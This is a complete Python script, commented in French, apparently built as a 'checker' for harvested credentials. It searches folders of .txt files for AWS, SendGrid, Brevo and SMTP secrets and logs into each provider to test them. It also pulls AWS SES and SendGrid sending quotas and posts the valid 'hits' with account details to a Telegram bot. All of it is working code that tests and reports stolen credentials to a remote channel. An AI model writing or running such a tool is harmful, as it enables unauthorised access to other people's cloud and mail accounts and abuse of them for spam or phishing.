#!/usr/bin/env python3
"""
Scanner de dossiers .txt : détecte AWS, SendGrid, SMTP, Brevo,
valide les identifiants, récupère le quota quand c'est possible,
et envoie un résumé sur Telegram (webhook / bot API).
"""

from __future__ import annotations

import json
import os
import re
import smtplib
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from email.message import EmailMessage
from pathlib import Path
from typing import Any, Iterator

try:
    import boto3
    from botocore.exceptions import BotoCoreError, ClientError
except ImportError:
    boto3 = None  # type: ignore
    BotoCoreError = ClientError = Exception  # type: ignore

try:
    import requests
except ImportError:
    requests = None  # type: ignore


# --- Regex & patterns ---

SENDGRID_KEY_RE = re.compile(r"\b(SG\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)\b")
BREVO_KEY_RE = re.compile(r"\b(xkeysib-[a-fA-F0-9]{64}-[a-zA-Z0-9]+)\b")
AWS_ACCESS_RE = re.compile(r"\b((?:AKIA|ASIA|ABIA|ACCA)[A-Z0-9]{16})\b")
# Secret AWS classique : 40 caractères base64-like (ligne séparée souvent)
AWS_SECRET_RE = re.compile(r"\b([A-Za-z0-9/+=]{40})\b")

SMTP_URL_RE = re.compile(
    r"smtp(?:s)?://([^:]+):([^@]+)@([^:/]+)(?::(\d+))?",
    re.IGNORECASE,
)

# Lignes type .env
ENV_PAIR_RE = re.compile(r"^\s*([A-Za-z0-9_]+)\s*=\s*(.*)\s*$")


@dataclass(frozen=True)
class AwsCreds:
    access_key: str
    secret_key: str
    session_token: str | None = None


@dataclass
class Hit:
    kind: str
    source_file: str
    valid: bool
    detail: str
    quota: dict[str, Any] = field(default_factory=dict)
    raw_hint: str = ""  # masqué pour logs


def _mask(s: str, keep: int = 4) -> str:
    if len(s) <= keep * 2:
        return "***"
    return s[:keep] + "…" + s[-keep:]


def _telegram_send(token: str, chat_id: str, text: str) -> None:
    url = f"https://api.telegram.org/bot{urllib.parse.quote(token)}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text[:4000],  # limite Telegram
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    data = urllib.parse.urlencode(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    with urllib.request.urlopen(req, timeout=30) as resp:
        body = resp.read().decode("utf-8", errors="replace")
    j = json.loads(body)
    if not j.get("ok"):
        raise RuntimeError(f"Telegram API: {body}")


def _telegram_send_requests(token: str, chat_id: str, text: str) -> None:
    assert requests is not None
    r = requests.post(
        f"https://api.telegram.org/bot{token}/sendMessage",
        json={
            "chat_id": chat_id,
            "text": text[:4000],
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        },
        timeout=30,
    )
    r.raise_for_status()
    j = r.json()
    if not j.get("ok"):
        raise RuntimeError(f"Telegram API: {r.text}")


def send_telegram(token: str, chat_id: str, text: str) -> None:
    if requests:
        _telegram_send_requests(token, chat_id, text)
    else:
        _telegram_send(token, chat_id, text)


def iter_txt_files(root: Path) -> Iterator[Path]:
    for p in root.rglob("*.txt"):
        if p.is_file():
            yield p


def parse_env_like_lines(text: str) -> dict[str, str]:
    out: dict[str, str] = {}
    for line in text.splitlines():
        m = ENV_PAIR_RE.match(line)
        if not m:
            continue
        k, v = m.group(1), m.group(2).strip().strip('"').strip("'")
        out[k] = v
    return out


def extract_sendgrid_keys(text: str) -> set[str]:
    return set(SENDGRID_KEY_RE.findall(text))


def extract_brevo_keys(text: str) -> set[str]:
    return set(BREVO_KEY_RE.findall(text))


def extract_aws_from_text(text: str) -> set[AwsCreds]:
    env = parse_env_like_lines(text)
    keys: set[AwsCreds] = set()

    # Paires explicites .env
    for ak_var, sk_var in (
        ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"),
        ("AWS_ACCESS_KEY", "AWS_SECRET_KEY"),
    ):
        ak = env.get(ak_var)
        sk = env.get(sk_var)
        if ak and sk:
            ak = ak.strip()
            sk = sk.strip()
            if AWS_ACCESS_RE.fullmatch(ak) and AWS_SECRET_RE.fullmatch(sk):
                st = env.get("AWS_SESSION_TOKEN")
                keys.add(AwsCreds(ak, sk, st.strip() if st else None))

    # Même ligne ou lignes voisines (évite le produit cartésien sur tout le fichier)
    lines = text.splitlines()
    for i, line in enumerate(lines):
        ak_m = AWS_ACCESS_RE.search(line)
        if not ak_m:
            continue
        ak = ak_m.group(1)
        tail = line[ak_m.end() :]
        sk_m = AWS_SECRET_RE.search(tail)
        if sk_m and sk_m.group(1) != ak:
            keys.add(AwsCreds(ak, sk_m.group(1), None))
            continue
        for j in range(1, min(5, len(lines) - i)):
            sk_m = AWS_SECRET_RE.search(lines[i + j])
            if sk_m and sk_m.group(1) != ak:
                keys.add(AwsCreds(ak, sk_m.group(1), None))
                break

    return keys


def extract_smtp_from_text(path: Path, text: str) -> set[tuple[str, int, str, str]]:
    """(host, port, user, password)"""
    found: set[tuple[str, int, str, str]] = set()
    env = parse_env_like_lines(text)

    for m in SMTP_URL_RE.finditer(text):
        user, pw, host, port_s = m.group(1), m.group(2), m.group(3), m.group(4)
        port = int(port_s) if port_s else 587
        found.add((host, port, urllib.parse.unquote(user), urllib.parse.unquote(pw)))

    def pick(*names: str) -> str | None:
        for n in names:
            v = env.get(n)
            if v:
                return v
        return None

    host = pick("SMTP_HOST", "MAIL_HOST", "EMAIL_HOST", "SMTP_SERVER")
    user = pick("SMTP_USER", "SMTP_USERNAME", "MAIL_USERNAME", "EMAIL_USER")
    pw = pick("SMTP_PASS", "SMTP_PASSWORD", "MAIL_PASSWORD", "EMAIL_PASSWORD")
    port_s = pick("SMTP_PORT", "MAIL_PORT", "EMAIL_PORT")
    if host and user and pw:
        port = int(port_s or "587")
        found.add((host.strip(), port, user.strip(), pw.strip()))

    return found


def validate_sendgrid(api_key: str) -> tuple[bool, str, dict[str, Any]]:
    quota: dict[str, Any] = {}
    try:
        req = urllib.request.Request(
            "https://api.sendgrid.com/v3/scopes",
            headers={"Authorization": f"Bearer {api_key}"},
            method="GET",
        )
        with urllib.request.urlopen(req, timeout=20) as resp:
            if resp.status != 200:
                return False, f"HTTP {resp.status}", {}
        # Crédits / quota d'envoi
        req2 = urllib.request.Request(
            "https://api.sendgrid.com/v3/user/credits",
            headers={"Authorization": f"Bearer {api_key}"},
            method="GET",
        )
        try:
            with urllib.request.urlopen(req2, timeout=20) as r2:
                quota = json.loads(r2.read().decode())
        except urllib.error.HTTPError:
            pass
    except urllib.error.HTTPError as e:
        return False, f"HTTP {e.code}", {}
    except Exception as e:
        return False, str(e), {}
    return True, "OK", quota


def validate_brevo(api_key: str) -> tuple[bool, str, dict[str, Any]]:
    quota: dict[str, Any] = {}
    try:
        req = urllib.request.Request(
            "https://api.brevo.com/v3/account",
            headers={"api-key": api_key, "Accept": "application/json"},
            method="GET",
        )
        with urllib.request.urlopen(req, timeout=20) as resp:
            body = resp.read().decode()
            quota = json.loads(body) if body else {}
        return True, "OK", quota
    except urllib.error.HTTPError as e:
        try:
            err = e.read().decode()
        except Exception:
            err = str(e)
        return False, f"HTTP {e.code}: {err[:200]}", {}
    except Exception as e:
        return False, str(e), {}


def validate_aws(creds: AwsCreds) -> tuple[bool, str, dict[str, Any]]:
    quota: dict[str, Any] = {}
    if boto3 is None:
        return False, "boto3 non installé (pip install boto3)", {}
    try:
        kwargs: dict[str, Any] = {
            "aws_access_key_id": creds.access_key,
            "aws_secret_access_key": creds.secret_key,
        }
        if creds.session_token:
            kwargs["aws_session_token"] = creds.session_token
        client = boto3.client("sts", **kwargs)
        ident = client.get_caller_identity()
        quota["caller_identity"] = ident
        try:
            ses = boto3.client("ses", **kwargs)
            q = ses.get_send_quota()
            quota["ses"] = q
        except (ClientError, BotoCoreError):
            quota["ses"] = None
        return True, ident.get("Arn", "OK"), quota
    except (ClientError, BotoCoreError) as e:
        return False, str(e), {}
    except Exception as e:
        return False, str(e), {}


def validate_smtp(host: str, port: int, user: str, password: str) -> tuple[bool, str, dict[str, Any]]:
    meta: dict[str, Any] = {"host": host, "port": port}
    try:
        ctx = ssl.create_default_context()
        if port == 465:
            server = smtplib.SMTP_SSL(host, port, timeout=25, context=ctx)
        else:
            server = smtplib.SMTP(host, port, timeout=25)
            server.ehlo()
            try:
                server.starttls(context=ctx)
                server.ehlo()
            except smtplib.SMTPException:
                pass
        try:
            server.login(user, password)
        finally:
            try:
                server.quit()
            except Exception:
                pass
        return True, "auth OK", meta
    except Exception as e:
        return False, str(e), meta


def format_hit_message(h: Hit) -> str:
    lines = [f"<b>{h.kind}</b>", f"Fichier: <code>{h.source_file}</code>"]
    if h.valid:
        lines.append("✅ <b>Valide</b>")
    else:
        lines.append("❌ Invalide")
    lines.append(f"Détail: {_escape_html(h.detail)}")
    if h.quota:
        try:
            qj = json.dumps(h.quota, indent=2, ensure_ascii=False)[:1500]
            lines.append(f"Quota / infos:\n<pre>{_escape_html(qj)}</pre>")
        except Exception:
            lines.append(f"Quota: <code>{_escape_html(str(h.quota)[:500])}</code>")
    if h.raw_hint:
        lines.append(f"Ref: <code>{_escape_html(h.raw_hint)}</code>")
    return "\n".join(lines)


def _escape_html(s: str) -> str:
    return (
        s.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


def build_telegram_hits_message(hits: list[Hit]) -> str:
    valid = [h for h in hits if h.valid]
    if not valid:
        return "🔍 <b>Scan terminé</b>\n\nAucun identifiant valide trouvé."

    parts = ["🎯 <b>HIT — credentials valides</b>\n"]
    by_kind: dict[str, list[Hit]] = {}
    for h in valid:
        by_kind.setdefault(h.kind, []).append(h)

    emoji_map = {
        "SendGrid": "📧",
        "Brevo": "🔵",
        "AWS": "☁️",
        "SMTP": "📬",
    }
    for kind, group in by_kind.items():
        em = emoji_map.get(kind, "✨")
        parts.append(f"\n{em} <b>Hit {kind}</b> ({len(group)})\n")
        for h in group:
            parts.append(format_hit_message(h))
            parts.append("— — —")
    return "\n".join(parts)


def scan_folder(root: Path) -> list[Hit]:
    hits: list[Hit] = []
    seen_sg: set[str] = set()
    seen_br: set[str] = set()
    seen_aws: set[tuple[str, str, str | None]] = set()
    seen_smtp: set[tuple[str, int, str, str]] = set()

    for path in iter_txt_files(root):
        rel = str(path.relative_to(root))
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
        except OSError as e:
            print(f"⚠️  Impossible de lire {path}: {e}", file=sys.stderr)
            continue

        for key in extract_sendgrid_keys(text):
            if key in seen_sg:
                continue
            seen_sg.add(key)
            ok, msg, quota = validate_sendgrid(key)
            hits.append(
                Hit(
                    "SendGrid",
                    rel,
                    ok,
                    msg,
                    quota,
                    _mask(key),
                )
            )

        for key in extract_brevo_keys(text):
            if key in seen_br:
                continue
            seen_br.add(key)
            ok, msg, quota = validate_brevo(key)
            hits.append(
                Hit(
                    "Brevo",
                    rel,
                    ok,
                    msg,
                    quota,
                    _mask(key),
                )
            )

        for creds in extract_aws_from_text(text):
            sig = (creds.access_key, creds.secret_key, creds.session_token)
            if sig in seen_aws:
                continue
            seen_aws.add(sig)
            ok, msg, quota = validate_aws(creds)
            hits.append(
                Hit(
                    "AWS",
                    rel,
                    ok,
                    msg,
                    quota,
                    _mask(creds.access_key) + " / " + _mask(creds.secret_key),
                )
            )

        for smtp_t in extract_smtp_from_text(path, text):
            if smtp_t in seen_smtp:
                continue
            seen_smtp.add(smtp_t)
            host, port, user, pw = smtp_t
            ok, msg, meta = validate_smtp(host, port, user, pw)
            merged = {**meta, "note": "Pas de quota standard côté SMTP."}
            hits.append(
                Hit(
                    "SMTP",
                    rel,
                    ok,
                    msg,
                    merged,
                    f"{host}:{port} / {_mask(user)}",
                )
            )

    return hits


def main() -> int:
    print("=== Checker AWS / SendGrid / SMTP / Brevo → Telegram ===\n")
    folder = input("Dossier à analyser (contenant des .txt) : ").strip().strip('"').strip("'")
    if not folder:
        print("Dossier vide.", file=sys.stderr)
        return 1
    root = Path(folder).expanduser().resolve()
    if not root.is_dir():
        print(f"Pas un dossier: {root}", file=sys.stderr)
        return 1

    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    if not token:
        token = input("Token du bot Telegram (ou variable TELEGRAM_BOT_TOKEN) : ").strip()
    if not chat_id:
        chat_id = input("Chat ID Telegram (ou variable TELEGRAM_CHAT_ID) : ").strip()

    if not token or not chat_id:
        print("Telegram: token et chat_id requis pour l'envoi.", file=sys.stderr)
        return 1

    print(f"\n🔎 Scan de {root} …")
    hits = scan_folder(root)
    valid_n = sum(1 for h in hits if h.valid)
    print(f"Trouvé {len(hits)} candidat(s), {valid_n} valide(s).")

    msg = build_telegram_hits_message(hits)
    try:
        send_telegram(token, chat_id, msg)
        print("✅ Message envoyé sur Telegram.")
    except Exception as e:
        print(f"❌ Échec Telegram: {e}", file=sys.stderr)
        print("\n--- Aperçu du message ---\n")
        print(msg[:2000])
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
